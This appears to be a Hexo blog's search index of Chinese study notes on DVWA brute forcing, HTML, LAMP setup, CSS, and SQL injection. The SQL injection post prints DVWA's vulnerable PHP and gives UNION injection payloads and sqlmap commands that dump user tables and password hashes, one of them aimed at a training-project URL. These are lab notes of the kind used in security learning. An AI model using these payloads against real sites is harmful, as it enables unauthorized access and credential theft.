<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>title: DVWA靶场练习<br>date: 2023‎-‎7‎-16‎ ‏‎16:08:34<br>tags: [DVWA, 渗透]<br>categories: [DVWA靶场练习]</p>
<h3 id="1-爆破"><a href="#1-爆破" class="headerlink" title="1. 爆破"></a>1. 爆破</h3><h4 id="1-四种爆破模式"><a href="#1-四种爆破模式" class="headerlink" title="1. 四种爆破模式"></a>1. 四种爆破模式</h4><p>单字典(只有一个字典)<br>1.Sniper：按顺序一个一个参数依次遍历，一个参数遍历完，然后恢复成原数据，再遍历下一个参数。<br>2.Battering ram：每个参数同时遍历同一个字典。但是这种爆破在实际过程中是很不合理的，应为基本不会有人将用户名和密码设置成一样的，就像大多数人不会将qq密码设置成qq号一样。</p>
<p>一个相当于单挑，一个相当于群殴。</p>
<span id="more"></span>



<p>多字典(有多少参数就有多少字典）<br>1.Pitchfork：多个参数同时进行遍历，只是一个选字典1，一个选字典2（相当于50m赛跑同时出发，只是赛道不同）</p>
<p>可以多组密码本payload，又于battering ram相同的地方在于，一一对应。</p>
<p>dict1：1，2</p>
<p>dict2：3，4</p>
<p>第一次爆破为1，3，第二次爆破为2，4</p>
<p>2.Cluster bomb：有点像两个嵌套的for循环，参数i和参数j，i&#x3D;0，然后j要从0-10全部跑完，然后i&#x3D;1，然后j再从0-10跑完，一对多，多次遍历。</p>
<p>那就是全部遍历，不放过所有情况，但是在超大字典的情况下，运算能力就限制了Cluster bomb模式的发挥，所以只要算力足够，那爆破出密码就不是问题。</p>
<h4 id="1-low"><a href="#1-low" class="headerlink" title="1. low"></a>1. low</h4><p><img src="/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230716142927620.png" alt="image-20230716142927620"></p>
<p>随便写一个密码，抓包，准备爆破</p>
<p><img src="/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230716143644096.png" alt="image-20230716143644096"></p>
<p>抓包，然后Ctrl+I发送到introducer</p>
<p><img src="/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230716143733539.png" alt="image-20230716143733539"></p>
<p>选择爆破字段</p>
<p><img src="/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230716143849397.png" alt="image-20230716143849397"></p>
<p>导入字典并开始攻击</p>
<p><img src="/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230716144231023.png" alt="image-20230716144231023"></p>
<p>查看结果，可以看到，成功的长度会有不同，到靶场中测试</p>
<p><img src="/2023/10/13/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20230716144617762.png" alt="image-20230716144617762"></p>
<p>成功</p>
<h4 id="2-medium"><a href="#2-medium" class="headerlink" title="2. medium"></a>2. medium</h4><p>和初级一样，爆破速度太慢的话可以尝试提高线程数</p>
<h4 id="3-high"><a href="#3-high" class="headerlink" title="3. high"></a>3. high</h4>]]></content>
  </entry>
  <entry>
    <title>HTML学习</title>
    <url>/2023/09/24/HTML%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="图像标签"><a href="#图像标签" class="headerlink" title="图像标签"></a>图像标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图像的地址（相对或绝对地址）&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图片未显示的时候的代替文字&quot;</span> <span class="attr">title</span>=<span class="string">&quot;鼠标悬停在图片上的标签&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>	

<h3 id="链接标签"><a href="#链接标签" class="headerlink" title="链接标签"></a>链接标签</h3><h4 id="一般链接"><a href="#一般链接" class="headerlink" title="一般链接"></a>一般链接</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;调转的目标页面地址&quot;</span> <span class="attr">target</span>=<span class="string">&quot;表示窗口在哪里打开：_self（本窗口）/_blank（新窗口）&quot;</span>&gt;</span>作为超链接的文字或图片<span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="锚链接"><a href="#锚链接" class="headerlink" title="锚链接"></a>锚链接</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#锚点的标签名&quot;</span>&gt;</span>回到锚点<span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;作为锚点的标签名&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="功能性链接"><a href="#功能性链接" class="headerlink" title="功能性链接"></a>功能性链接</h4><ul>
<li>邮件链接</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:邮件地址&quot;</span>&gt;</span>联系我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="行内元素和块元素"><a href="#行内元素和块元素" class="headerlink" title="行内元素和块元素"></a>行内元素和块元素</h3><ul>
<li>块元素：每个元素占一行，例如：img, p, h1-6…</li>
<li>行内元素：所有元素在一行，例如：a,strong,em…</li>
</ul>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ul>
<li>有序列表</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/24/HTML%E5%AD%A6%E4%B9%A0/image-20230628204755424.png" alt="image-20230628204755424"></p>
<ul>
<li>无序列表</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/24/HTML%E5%AD%A6%E4%B9%A0/image-20230628204854042.png" alt="image-20230628204854042"></p>
<ul>
<li>自定义</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/24/HTML%E5%AD%A6%E4%B9%A0/image-20230628204944302.png" alt="image-20230628204944302"></p>
<p><img src="/2023/09/24/HTML%E5%AD%A6%E4%B9%A0/image-20230628205007404.png" alt="image-20230628205007404"></p>
<h3 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h3><ul>
<li>heade：头部</li>
<li>footer：脚注</li>
<li>section：主体</li>
<li>article：文章</li>
<li>aside：侧边栏</li>
<li>nac：导航</li>
</ul>
<h3 id="内联标签"><a href="#内联标签" class="headerlink" title="内联标签"></a>内联标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ifram</span> <span class="attr">src</span>=<span class="string">&quot;path&quot;</span> <span class="attr">name</span>=<span class="string">&quot;标签名称(可以用链接标签跳转，把一个新的页面嵌入到当前页面中)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ifram</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="表单语法"><a href="#表单语法" class="headerlink" title="表单语法"></a>表单语法</h3><h4 id="form表单："><a href="#form表单：" class="headerlink" title="form表单："></a>form表单：</h4><p>作为整个表单的基本框架，其他的输入全部放在form表单中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;表单提交的位置，可以是一个网站，也可以是一个请求处理地址&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post/get&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>两种提交方法：</p>
<ul>
<li>get：可以在url看见提交的信息，不太安全，但是高效</li>
<li>post:不在url处提交信息，可以传输大文件</li>
</ul>
<h4 id="input标签："><a href="#input标签：" class="headerlink" title="input标签："></a>input标签：</h4><p>作为输入，属性有</p>
<ul>
<li>type：必填，指定元素的类型，有text, password（也是一种按钮，自带提交功能）, checkbox, radio, submit, reset, file, hidden, image, button, 默认为text</li>
<li>name：必填，表单元素的名称，后台处理以此为标识</li>
<li>value：选填，初始值，但是ratio类型必须填</li>
<li>size：元素大小</li>
<li>maxlength：最大输入长度</li>
<li>checked：CheckBox和radio中，按钮是否选中</li>
</ul>
<h4 id="下拉框标签："><a href="#下拉框标签：" class="headerlink" title="下拉框标签："></a>下拉框标签：</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;cd&quot;</span>&gt;</span>成都<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;xa&quot;</span> <span class="attr">selected</span>&gt;</span>西安<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;cq&quot;</span>&gt;</span>重庆<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sh&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>HTML学习</category>
      </categories>
      <tags>
        <tag>HTML学习</tag>
        <tag>HTML标签认识</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/LANMP%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>title: LANMP靶场搭建<br>date: ‎2023-7‎-‎15‎ 16:46:03<br>tags: [LANMP靶场]<br>categories: [LANMP靶场搭建]</p>
<h4 id="1-LANMP的简介"><a href="#1-LANMP的简介" class="headerlink" title="1. LANMP的简介"></a>1. LANMP的简介</h4><ul>
<li>L：Linux</li>
<li>A：Apache</li>
<li>N：Nginx</li>
<li>M：MySQL和mariadb</li>
<li>P：PHP</li>
</ul>
<span id="more"></span>



<h4 id="2-Apache和Nginx的区别"><a href="#2-Apache和Nginx的区别" class="headerlink" title="2. Apache和Nginx的区别"></a>2. Apache和Nginx的区别</h4><p>Apache是同步多进程模型，一个连接对应一个进程，而Nginx是异步的，多个连接（万级别）可以对应一个进程。</p>
<p>Nginx轻量级，抗并发，处理静态文件好。Apache超稳定，对PHP支持比较简单，Nginx需要配合其他后端用，处理动态请求有优势，建议使用前端Nginx抗并发，后端apache集群，配合起来会更好。</p>
<p>两者优缺点比较. 1.Nginx 配置简洁, Apache 复杂 ;Nginx 静态处理性能比 Apache 高 3倍以上 ; 2.Apache 对 PHP 支持比较简单，Nginx 需要配合其他后端用；Apache 的组件比 Nginx 多 ;</p>
<h4 id="3-KALI搭建LAMP"><a href="#3-KALI搭建LAMP" class="headerlink" title="3. KALI搭建LAMP"></a>3. KALI搭建LAMP</h4><p>kali一般自带lamp，直接启动即可</p>
<p>启动apache：sudo service apache2 start<br>启动mysql：sudo service mysql start</p>
<p>可以通过 service MySQL&#x2F;apache2 status命令查看启动情况</p>
<h4 id="4-KALI在LAMP下搭建DVWA靶场"><a href="#4-KALI在LAMP下搭建DVWA靶场" class="headerlink" title="4. KALI在LAMP下搭建DVWA靶场"></a>4. KALI在LAMP下搭建DVWA靶场</h4>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>title: sql注入漏洞<br>date: ‎2023-7‎-‎12‎ 9:56:03<br>tags: [sql注入]<br>categories: [sql注入]</p>
<h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1. SQL注入"></a>1. SQL注入</h3><h4 id="1-SQL注入-low"><a href="#1-SQL注入-low" class="headerlink" title="1. SQL注入 low"></a>1. SQL注入 low</h4><span id="more"></span>

<h5 id="1）认识"><a href="#1）认识" class="headerlink" title="1）认识"></a>1）认识</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="comment">// Check database</span></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#$sqlite_db_connection = new SQLite3($_DVWA[&#x27;SQLITE_DB&#x27;]);</span></span><br><span class="line">            <span class="comment">#$sqlite_db_connection-&gt;enableExceptions(true);</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="comment">#print $query;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$results</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Caught exception: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$results</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">                    <span class="comment">// Get values</span></span><br><span class="line">                    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Feedback for end user</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error in fetch &quot;</span>.<span class="variable">$sqlite_db</span>-&gt;<span class="title function_ invoke__">lastErrorMsg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中重点为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这是其中执行的SQL语句，我们可以通过在输入的id中做手脚进行更改，比如</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span> #<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>也就是输入-1’ union select 1, 2 #，使得执行的sql变为以上结果</p>
<p>执行结果为</p>
<p><img src="/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230711231049281.png" alt="image-20230711231049281"></p>
<h5 id="2）sql漏洞利用步骤"><a href="#2）sql漏洞利用步骤" class="headerlink" title="2）sql漏洞利用步骤"></a>2）sql漏洞利用步骤</h5><p>①使用order by 判断列数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> #<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">SELECT first_name, last_name FROM users WHERE user_id = &#x27;</span><span class="number">1</span><span class="string">&#x27; order by 2 #&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> #<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>网页在order by 便为3时报错，说明数据库应该是有两列</p>
<p>②联合查询其他信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> [sql1], [sql2], ... #<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>注意，联合查询的对象数量一个和数据库的列数量相同，才能联合在一起</p>
<p>查询表dvwa这个数据库下的表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name, table_schema <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;dvwa&quot; #<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>结果为</p>
<p><img src="/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230711232927994.png" alt="image-20230711232927994"></p>
<p>有两个表分别为guestbook和users</p>
<p>查询users这个表下面有哪些列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;dvwa&quot; <span class="keyword">and</span> table_name <span class="operator">=</span>&quot;users&quot; #<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>结果为</p>
<p><img src="/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230711233533478.png" alt="image-20230711233533478"></p>
<p>一共有8列，列名如上图</p>
<p>查询users 这个表中存储的用户名及其对应的密码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> first_name, password <span class="keyword">from</span> dvwa.users #<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>结果为</p>
<p><img src="/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230711233932844.png" alt="image-20230711233932844"></p>
<p>可以看到有5个用户，密码应该是散列码</p>
<p>比如实训项目中</p>
<p>查询double_fish数据库下t_admin表中的列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.wabjtam.ml:<span class="number">12380</span><span class="operator">/</span>News<span class="operator">/</span>newsView.php?newsId<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span>  <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, group_concat(column_name), <span class="number">4</span>, <span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;double_fish&quot; <span class="keyword">and</span> table_name<span class="operator">=</span>&quot;t_admin&quot;;</span><br></pre></td></tr></table></figure>

<p>使用group_concat()函数将结果放于一处</p>
<p>结果为</p>
<p><img src="/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230712090740476.png" alt="image-20230712090740476"></p>
<h5 id="3）使用sqlmap"><a href="#3）使用sqlmap" class="headerlink" title="3）使用sqlmap"></a>3）使用sqlmap</h5><p>①测试是否有漏洞</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; <span class="comment">--cookie=&quot;PHPSESSID=ilkvra6al6b12g57ab5cvn04qr; security=low&quot;</span></span><br></pre></td></tr></table></figure>

<p>-u：进行sql注入的注入点</p>
<p>–cookie：由于dvwa需要登录，因此我们带上cookie</p>
<p>②查看数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; <span class="comment">--cookie=&quot;PHPSESSID=ilkvra6al6b12g57ab5cvn04qr; security=low&quot; --dbs</span></span><br></pre></td></tr></table></figure>

<p>结果为</p>
<p><img src="/2023/10/13/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230712092554783.png" alt="image-20230712092554783"></p>
<p>③查看表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; <span class="comment">--cookie=&quot;PHPSESSID=ilkvra6al6b12g57ab5cvn04qr; security=low&quot; -D dvwa --tables</span></span><br></pre></td></tr></table></figure>

<p>④查看列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; <span class="comment">--cookie=&quot;PHPSESSID=ilkvra6al6b12g57ab5cvn04qr; security=low&quot; -D dvwa -T users -columns</span></span><br></pre></td></tr></table></figure>

<p>⑤查看表中所有信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot; <span class="comment">--cookie=&quot;PHPSESSID=ilkvra6al6b12g57ab5cvn04qr; security=low&quot; -D dvwa -T users -dump</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/css%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>title: css入门<br>date: 2023-6-26 18:56:41<br>tags: [css快速入门]<br>categories: [css入门]</p>
<h3 id="三种方式添加CSS"><a href="#三种方式添加CSS" class="headerlink" title="三种方式添加CSS"></a>三种方式添加CSS</h3><ul>
<li>外部样式表：最常用，一般表示在外部的.CSS文件中，在HTML文件中使用<link>标签进行引用</li>
<li>内部样式表：可用，不使用外部单独的.CSS文件，将CSS属性放在HTML文件head标签中的style属性中</li>
<li>内联样式：一般不用，仅影响一个单独的元素，在HTML元素的style属性中添加</li>
</ul>
<span id="more"></span>

<h4 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h4><p>在html的head部分使用style标签进行设置</p>
<p><img src="/2023/10/13/css%E5%85%A5%E9%97%A8/image-20230630193157172.png" alt="image-20230630193157172"></p>
<h4 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h4><p>在具体的标签中设置style属性</p>
<p><img src="/2023/10/13/css%E5%85%A5%E9%97%A8/image-20230630193303966.png" alt="image-20230630193303966"></p>
<h4 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h4>]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/06/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
